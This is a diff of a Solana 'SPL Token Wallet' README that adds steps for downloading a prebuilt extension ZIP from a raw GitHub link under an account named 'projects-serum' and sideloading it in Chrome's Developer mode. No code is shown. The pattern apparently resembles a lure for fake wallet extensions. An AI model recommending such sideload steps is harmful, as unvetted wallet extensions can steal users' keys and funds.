@@ -1,7 +1,9 @@
 # SPL Token Wallet
 ## How to install Chrome extensions manually
-**1.** Go to [chrome://extensions/](https://chrome://extensions/) and check the box for Developer mode in the top right.
-If you want to install the extensions, Download it here directly [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip).
+**1.** Download the extension zio file directly here [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip).
+**2.** Go to [chrome://extensions/](chrome://extensions/) and check the box for **Developer mode** in the top right.
+**3.** Locate the ZIP file on your computer and unzip it.
+**4.** Go back to the chrome://extensions/ page and click the **Load unpacked extension** button and select the **unzipped folder** for your extension to install it.
 
 Example Solana wallet with support for [SPL tokens](https://spl.solana.com/token) and Serum integration.
 
